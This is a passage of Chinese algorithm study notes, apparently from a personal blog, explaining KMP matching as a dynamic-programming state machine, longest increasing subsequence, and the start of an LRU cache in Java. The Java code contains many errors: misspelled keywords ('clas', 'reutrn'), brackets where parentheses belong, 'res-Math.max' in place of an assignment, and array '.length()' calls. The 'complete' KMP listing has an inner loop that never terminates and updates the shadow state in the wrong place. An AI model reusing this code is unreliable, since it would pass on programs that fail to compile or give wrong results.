class="line"><span class="string">for</span> <span class="number">0</span> <span class="string">&lt;=</span> <span class="string">c</span> <span class="string">&lt;</span> <span class="attr">256:</span> <span class="comment">#字符</span></span><br><span class="line"><span class="string">dp[j][c]</span> <span class="string">=</span> <span class="string">next</span></span><br></pre></td></tr></table></figure><p>求next 状态 , 遇到字符c和pat[j]匹配的话, 状态应该向前推进一个, 也就是说 next = j + 1 ,不妨称这种情况为状态推进:</p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210604211432689.png" alt="image-20210604211432689"></p><p>如果遇到字符c 和 pat[j] 不匹配的话, 状态就要回退(或者原地不动), 可称这种情况为状态重启: </p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210604211522558.png" alt="image-20210604211522558"></p><p>如何得知在哪个状态重启呢? 再定义一个名字: 影子状态 , 用变量X 表示 . <strong>所谓影子状态，就是和当前状态具有相同的前缀</strong>。比如下面这种情况：<img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210604211618808.png" alt="image-20210604211618808"></p><p>当前状态 j=4, 影子状态为 X=2, 都有相同的前缀 “AB”.因为状态<code>X</code>和状态<code>j</code>存在相同的前缀，所以当状态<code>j</code>准备进行状态重启的时候（遇到的字符<code>c</code>和<code>pat[j]</code>不匹配），可以通过<code>X</code>的状态转移图来获得<strong>最近的重启位置</strong>。</p><p>比如上面的情况 ,状态 j遇到一个字符”A”, 因该转移到哪里? 首先状态4只有遇到”C” 才能推进状态, 遇到”A” 那就智能进行状态重启, 状态j会把这个字符委托给状态X处理, 也就是dp[ j ] [ ‘A’ ] = dp[ X ] [ ‘A’ ] : </p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210604220132697.png" alt="image-20210604220132697"></p><p>这样做的原因: 既然 j 这边确定字符 “A” 无法推进状态, 只能回退, 而且KMP 算法就是要尽可能少的回退, 以免多余的计算, 那么 j 就可以去问问和自己具有相同前缀的 X ,如果X 遇见”A” 可以进行状态推进, 那就转移过去, 因为这样回退的最少: </p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/640" alt="图片"></p><p>​    当然, 如果遇到的字符是”B” , 状态X也不能进行状态 推进, 只能回退, j 只要跟着X 指引的方向回退就行了</p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210604220458664.png" alt="image-20210604220458664"></p><p>动态规划算法就是利用过去的结果解决现在的问题 </p><p>细化一下刚才的框架代码: </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">int</span> <span class="string">X</span> <span class="comment">#影子状态 </span></span><br><span class="line"><span class="string">for</span> <span class="number">0</span><span class="string">&lt;=j</span> <span class="string">&lt;</span> <span class="attr">M:</span></span><br><span class="line"><span class="string">for</span> <span class="number">0</span> <span class="string">&lt;=</span> <span class="string">c</span> <span class="string">&lt;256:</span> </span><br><span class="line"><span class="string">if</span> <span class="string">c==pat[j]:</span></span><br><span class="line">             <span class="comment">#状态推进 </span></span><br><span class="line">             <span class="string">dp[j][c]</span> <span class="string">=</span> <span class="string">j</span> <span class="string">+</span> <span class="number">1</span></span><br><span class="line"><span class="attr">else:</span> </span><br><span class="line"><span class="comment">#状态重启</span></span><br><span class="line"><span class="comment">#委托 X 计算重启位置</span></span><br><span class="line"><span class="string">dp[j][c]=dp[X][c]</span></span><br></pre></td></tr></table></figure><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>最后一个问题: 影子状态 X是如何获得的呢 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> clas KMP&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span>[][] dp;</span><br><span class="line"><span class="keyword">private</span> String pat; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">KMP</span><span class="params">(String pat)</span></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.pat = pat;</span><br><span class="line"><span class="keyword">int</span> M = pat.length();</span><br><span class="line"><span class="comment">//dp[状态][字符] = 下个状态 </span></span><br><span class="line">dp = <span class="keyword">new</span> <span class="keyword">int</span>[M][<span class="number">256</span>];</span><br><span class="line"><span class="comment">//base case </span></span><br><span class="line">dp[<span class="number">0</span>][pat.charAt[<span class="number">0</span>]] = <span class="number">1</span>; </span><br><span class="line"><span class="comment">//影子状态X初始为 0 </span></span><br><span class="line"><span class="keyword">int</span> X = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//当前状态j 从 1 开始 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; M;j++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> c = <span class="number">0</span>; c &lt; <span class="number">256</span> ; c++)&#123;</span><br><span class="line"><span class="keyword">if</span>(pat.charAt(j)==c)</span><br><span class="line">dp[j][c] = j + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">dp[j][c] = dp[X][c];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//更新影子状态 </span></span><br><span class="line">X = dp[X][pat.charAt[j]];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">search</span><span class="params">(String txt)</span></span>&#123; <span class="keyword">return</span> <span class="number">0</span> ;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//base case </span></span><br><span class="line">dp[<span class="number">0</span>][pat.charAt[<span class="number">0</span>]] = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>这行代码是 base case , 只有遇到 pat[0] 这个字符才能使状态从0 转移到 1 , 遇到其它字符的话还是停留在状态 0 ( Java 默认初始化数组为 0 )</p><p>影子状态 X 是 先初始化为 0 , 然后随着j 的前进而不断跟新的 .  </p><p>如何更新状态X :</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> X = <span class="number">0</span> ;</span><br><span class="line"><span class="keyword">for</span>( <span class="built_in">int</span> j = <span class="number">1</span>; j &lt; M ; j++)&#123;</span><br><span class="line"><span class="comment">//更新影子状态 </span></span><br><span class="line"><span class="comment">//当前是状态 X, 遇到字符pat[j], </span></span><br><span class="line"><span class="comment">//pat 应该转移到哪个状态? </span></span><br><span class="line">X = dp[X][pat.charAt(j)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; N ; i++)&#123;</span><br><span class="line"><span class="comment">//当前是状态 j, 遇到字符 txt[i],</span></span><br><span class="line"><span class="comment">//pat 应该转移到哪个状态? </span></span><br><span class="line">j = dp[j][txt.charAt(i)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意 for 循环中的变量初始值  </p><p>后者在txt中匹配 pat, 前者在 pat 中匹配 pat[1:]. 状态 X 总是落后状态j 一个状态 , 与 j 具有最长的相同前缀 , 所以我们把X比喻为影子状态 </p><p>另外, 构建dp 数组是根据base case dp[0] [..] 向后推演. </p><p>下面来看一下状态转移图的完整构造过程, </p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/640" alt="图片"></p><p>KMP完整代码 : </p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="symbol">KMP</span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="built_in">int</span>[][]dp;</span><br><span class="line"><span class="keyword">private</span> String pat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> KMP(String pat)&#123;</span><br><span class="line"><span class="keyword">this</span>.pat = pat;</span><br><span class="line"><span class="built_in">int</span> M = pat.length();</span><br><span class="line"><span class="comment">//dp[状态][字符] = 下个撞他 </span></span><br><span class="line">dp = new <span class="built_in">int</span>[M][<span class="number">256</span>];</span><br><span class="line"><span class="comment">//base case </span></span><br><span class="line">dp[<span class="number">0</span>][pat.charAt(<span class="number">0</span>)] = <span class="number">1</span>;</span><br><span class="line"><span class="comment">//影子状态 </span></span><br><span class="line"><span class="built_in">int</span> X = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 构建状态转移图 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="built_in">int</span> j=<span class="number">1</span>;j&lt;M;j++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="built_in">int</span> c = <span class="number">0</span>;j &lt; <span class="number">256</span>; c++)&#123;</span><br><span class="line">dp[j][c] = dp[X][c];</span><br><span class="line">dp[j][pat.charAt(j)] = j+<span class="number">1</span>;</span><br><span class="line"><span class="comment">//影子状态 </span></span><br><span class="line">X =  dp[X][pat.charAt(j)]; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">int</span> search(String txt)&#123;</span><br><span class="line"><span class="built_in">int</span> M = pat.length();</span><br><span class="line"><span class="built_in">int</span> N = txt.length();</span><br><span class="line"><span class="comment">//pat的初始状态为 0  </span></span><br><span class="line"><span class="built_in">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span> ;i&lt;N; i++)&#123;</span><br><span class="line"><span class="comment">//计算pat 的下一个状态 </span></span><br><span class="line">j = dp[j][txt.charAt(i)];</span><br><span class="line"><span class="comment">//达到终止态, 返回结果</span></span><br><span class="line"><span class="keyword">if</span>(j==M) reutrn i - M + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//没达到终止态 </span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>传统的KMP 算法是使用一个一维数组 next 记录前缀信息, 而本文是使用一个二维数组 dp 以状态转移的角度解决字符匹配问题, 单身空间复杂度仍然是 O(256M) = O(M) </p><p>在pat 匹配 txt的过程中, 只要明确了[当前处在哪个状态] 和 [ 遇到的字符是什么 ] 这两个问题, 就可以确定应该转移到哪个状态(推进或回退) </p><p>对于一个模式串 pat, 其总共就有M 个状态, 对于 ASCII 字符, 总共不会超过256 种. 所以我们就构造一个数组 dp[M] [256] 来包含所有情况, 并且明确 dp 数组的含义 : </p><p> dp[ j ]  [c] = next 表示, 当前是状态 j, 遇到了字符 c, 应该转移到状态 next . </p><p>明确了其含义, 就可以很容易写出 search 函数的代码 </p><p>对于如何构建这个dp 数组, 需要一个辅助状态 X , 它永远比当前状态 j 落后一个状态 ,拥有和 j 最长的相同前缀 ,给它起了个名字交 [影子状态 ] </p><p>在构建当前状态<code>j</code>的转移方向时，只有字符<code>pat[j]</code>才能使状态推进（<code>dp[j][pat[j]] = j+1</code>）；而对于其他字符只能进行状态回退，应该去请教影子状态<code>X</code>应该回退到哪里（<code>dp[j][other] = dp[X][other]</code>，其中<code>other</code>是除了<code>pat[j]</code>之外所有字符）。</p><p>对于影子状态<code>X</code>，我们把它初始化为 0，并且随着<code>j</code>的前进进行更新，更新的方式和 search 过程更新<code>j</code>的过程非常相似（<code>X = dp[X][pat[j]]</code>）。</p><p>KMP 算法也就是动态规划的思路，我们的公众号文章目录有动态规划系列，而且都是按照一套框架来的，无非就是描述问题逻辑，明确<code>dp</code>数组含义，定义 base case 这点破事。</p><h3 id="最长递增子序列"><a href="#最长递增子序列" class="headerlink" title="最长递增子序列"></a>最长递增子序列</h3><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210604154952573.png" alt="image-20210604154952573"></p><p>子串一定是连续的,子序列不一定是连续的</p><h4 id="动态归纳解法"><a href="#动态归纳解法" class="headerlink" title="动态归纳解法"></a>动态归纳解法</h4><p>动态规划的核心设计思想是数学归纳法 </p><p>假设一个结论在 k&lt;n时成立,再证明k=n时成立, 当证明成立时,则说明这个结论对于k等于任何数都成立 </p><p>设计动态规划算法, 我们需要一个dp数组, 可以假设dp[0…i-1] 都已经被算出来了, 然后怎么通过这些结果算出dp[i]</p><p>dp[i] 表示以 nums[i] 这个数结尾的最长递增<strong>子序列</strong>的长度。</p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210604160605517.png" alt="image-20210604160605517"></p><p>算法演进过程:</p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/640-1622794011272" alt="图片"></p><p>根据此定义,我们的最终结果(子序列的最大长度) 应该是dp 数组的最大值 </p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(int <span class="built_in">i</span>=<span class="number">0</span>;<span class="built_in">i</span>&lt;dp.<span class="built_in">length</span>();<span class="built_in">i</span>++)&#123;</span><br><span class="line">res = Math.<span class="built_in">max</span>(res,dp[<span class="built_in">i</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br></pre></td></tr></table></figure><p>设计算法逻辑来正确计算dp[i]</p><p>推出dp[5]</p><p>递增子序列, 找出前面比nums[5] 值小的子序列,将nums[5]接到最后, 就可以形成一个新的递增子序列, 新的子序列长度加1 ,</p><p>可能会生成很多新的子序列, 但我们只要最长的子序列的长度作为dp[5]的值 </p><p>如</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(int <span class="built_in">j</span>=<span class="number">0</span>;<span class="built_in">j</span>&lt;<span class="built_in">i</span>;<span class="built_in">j</span>++)&#123;</span><br><span class="line"><span class="keyword">if</span>(nums[<span class="built_in">j</span>]&lt;nums[<span class="built_in">i</span>])&#123;</span><br><span class="line">dp[<span class="built_in">i</span>] = Math.<span class="built_in">max</span>(dp[<span class="built_in">i</span>],dp[<span class="built_in">j</span>]+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>计算任意dp[i]</p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210604162103356.png" alt="image-20210604162103356"></p><p>一个细节问题,  base case , dp 数组应该初始化为 1 , 因为子序列最少也要包含自己, 所以长度最小为1,</p><p>完整代码: </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLTS</span><span class="params">(<span class="keyword">int</span> []nums)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span>[]dp=<span class="keyword">new</span> <span class="keyword">int</span>[num.length()];</span><br><span class="line"><span class="comment">//dp 数组全都初始化为 1 </span></span><br><span class="line">Arrays.fill(dp,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length();i++ )&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(nums[j]&lt;nums[i])</span><br><span class="line">dp[i]=Math.max(dp[i],dp[j]+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dp.length();i++)&#123;</span><br><span class="line">res-Math.max(res,dp[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间复杂度 O(N^2)  ,动态规划设计流程  </p><ul><li>明确dp数组所存数据的含义(5*) ,不得当或不够清晰, 会阻碍之后的步骤 </li><li>根据dp数组的定义, 运用数学归纳法的思想, 假设dp[0…i-1] 都已知, 想办法求出dp[i], 这步完成 ,整个题目基本就解决了 </li><li>无法完成上一步时,可能是dp数组的定义不够恰当,需要重新定义dp数组的含义 ; 或者可能是dp数组促成农户的信息还不够, 不足以推出下一步的答案 , 需要把dp数组扩大成二维数组甚至三维数组</li></ul><h4 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h4><p>时间复杂度会将为O(NlogN) ,作为 了解 </p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210604192102467.png" alt="image-20210604192102467"></p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210604192125904.png" alt="image-20210604192125904"></p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210604192134305.png" alt="image-20210604192134305"></p><p>二分查找, 对本题来说二分查找难想, 有动态规划就足够, 但二分查找还是要学 </p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210604192157449.png" alt="image-20210604192157449">  </p><h3 id="状态压缩"><a href="#状态压缩" class="headerlink" title="状态压缩"></a>状态压缩</h3><p>对动态规划进行降维打击</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzAxODQxMDM0Mw==&mid=2247485824&idx=1&sn=09caa56172729cf8cf1b53089e8dee55&chksm=9bd7f788aca07e9e4149f384ec5e279adadec75a2828a76066c56b4789209fb1cd54f9e63f9d&scene=21#wechat_redirect" target="_blank" rel="noopener">参考</a></p><p>状态压缩就是投影</p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>动态规划</p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><h3 id="LRU"><a href="#LRU" class="headerlink" title="LRU"></a>LRU</h3><p>缓存淘汰策略 .快来手写LRU算法 </p><p>No146 .  </p><p>首先要接受一个cpacity 参数 作为缓存的最大容量 , 然后实现两个API ,一个是    put(key, val) 方法存入键值对, 另一个是get(key) 方法获取key 对应的val , 如果key 不存在则返回 -1. </p><p>注意哦, <strong>get</strong>和 <strong>put</strong>  方法是O(1) 的时间复杂度, 我们举个具体例子来看看LRU 算法怎么工作 .</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 缓存容量为 2 */</span> </span><br><span class="line">LRUCache cache = new LRUCache(<span class="number">2</span>); </span><br><span class="line"><span class="comment">// 可以把cache 理解成一个队列 </span></span><br><span class="line"><span class="comment">// 假设左边是对头, 右边是队尾</span></span><br><span class="line"><span class="comment">// 最近使用的排在对头, 右边是队尾</span></span><br><span class="line"><span class="comment">// 最近使用的排在对头, 久未使用的排在队尾 .</span></span><br><span class="line"><span class="comment">// 圆括号表示键值对( key, val)</span></span><br><span class="line"></span><br><span class="line">cache.put(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment">// cache = [(1,1)]</span></span><br><span class="line"></span><br><span class="line">cache.put(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line"><span class="comment">// cache = [(2,2), (1,1)]</span></span><br><span class="line"></span><br><span class="line">chche.<span class="keyword">get</span>(<span class="number">1</span>)  <span class="comment">//返回 1</span></span><br><span class="line"><span class="comment">// cache = [(1,1),(2,2)]</span></span><br><span class="line"><span class="comment">// 解释: 因为最近访问了键 1, 所以提前队头 </span></span><br><span class="line"><span class="comment">// 返回键 1 对应的值 1 </span></span><br><span class="line"></span><br><span class="line">cache.put(<span class="number">3</span>,<span class="number">3</span>);</span><br><span class="line"><span class="comment">// cache = [(3,3),(1,1)]</span></span><br><span class="line"><span class="comment">// 解释:缓存容量已满, 需要删除内容空出位置 </span></span><br><span class="line"><span class="comment">// 优先删除久未使用的数据, 也就是队尾的数据 </span></span><br><span class="line"><span class="comment">// 然后把新的数据插入队头</span></span><br><span class="line"></span><br><span class="line">cache.<span class="keyword">get</span>(<span class="number">2</span>) ;     <span class="comment">// 返回 -1 (未找到)</span></span><br><span class="line"><span class="comment">// cache = [(3,3),(1,1)]</span></span><br><span class="line"><span class="comment">// 解释 : cache 中不存在键为 2的数据 </span></span><br><span class="line"></span><br><span class="line">cache.put(<span class="number">1</span>,<span class="number">4</span>)</span><br><span class="line"><span class="comment">// cache = [(1,4).(3,3)]</span></span><br><span class="line"><span class="comment">// 解释: 键 1已存在, 把原始值覆盖为4 </span></span><br><span class="line"><span class="comment">// 不要忘了也要将键值队提到 队头</span></span><br></pre></td></tr></table></figure><h4 id="LRU-设计"><a href="#LRU-设计" class="headerlink" title="LRU 设计"></a>LRU 设计</h4><ol><li><p>分析上面操作过程, 要让put和get 方法 时间复杂度为O(1), 我们可以总结出 cache 这个数据结构必要条件 </p></li><li><p>在cache中快速找某个key是否已存在并得到对应的value</p></li><li><p>每次访问 cache 中的某个key , 需要将这个元素变为最近使用的, 也就是cache 要支持在任意位置快速插入和删除元素 </p></li></ol><p>结合上面要求 , 形成一种新的数据结构: 哈希链表 : LinkedHashMap</p><p>LRU 缓存算法的核心数据结构就是哈希链表, 双向链表和哈希表的结合体 </p><p><img src="../images/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/4.jpg" alt="HashLinkedList"></p><p>我们构建 缓存 需要删除操作 ,删除一个节点不光要得到该节点本身的指针, 也需要操作其前驱节点的指针,而双向链表才能支持查找前驱, 保证操作的时间复杂度O(1)</p><p><strong>注意我们实现的双链表只能从尾部插入, 也就是说靠近尾部的数据是最近使用的 , 靠头部的数据是最久未使用的</strong></p><p>有了双向链表的实现, 我们只需要在LRU算法中把它和哈希表结合起来即可 </p><p>同时维护一个双链表cache和一个哈希表map , 很容易漏掉一些操作, 比如删除某个key 时 , 在cache 中删除了对应的Node, 但忘记了在map中删除 key </p><p><strong>在两种数据结构上提供一层抽象API</strong> </p><p>尽量让LUR 的主方法 get 和 put 避免直接操作 map和 cache 的细节 </p><p>当我们对元素进行操作时的时候, 我们需要用到key来保证 cache 和 map的一致性 </p><p>当缓存容量已满, 我们不仅仅要删除最后一个Node 节点, 还要把map 中映射到该节点的key同时删除, 而这个key 只能由 Node 得到 , 如果 Node 结构中只存储 val , 那么我们就无法得知key 时什么 , 无法删除 map 中的键 , 造成错误</p><p>使用函数 对 操作进行简单封装 ,调用这些函数就可以避免直接操作 cache 链表 和 map 哈希表   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> LRU;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> badpoone</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">int</span> key,val;</span><br><span class="line">    <span class="keyword">public</span>  Node next, prev;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="title">Node</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.key = k ;</span><br><span class="line">        <span class="keyword">this</span>.val = v ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/******* */</span></span><br><span class="line"><span class="keyword">package</span> LRU;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> badpoone</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DoubleList</span> </span>&#123;</span><br><span class="line">    <span class="comment">//头尾虚节点</span></span><br><span class="line">    <span class="keyword">private</span> Node head, tail;</span><br><span class="line">    <span class="comment">//链表元素数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span 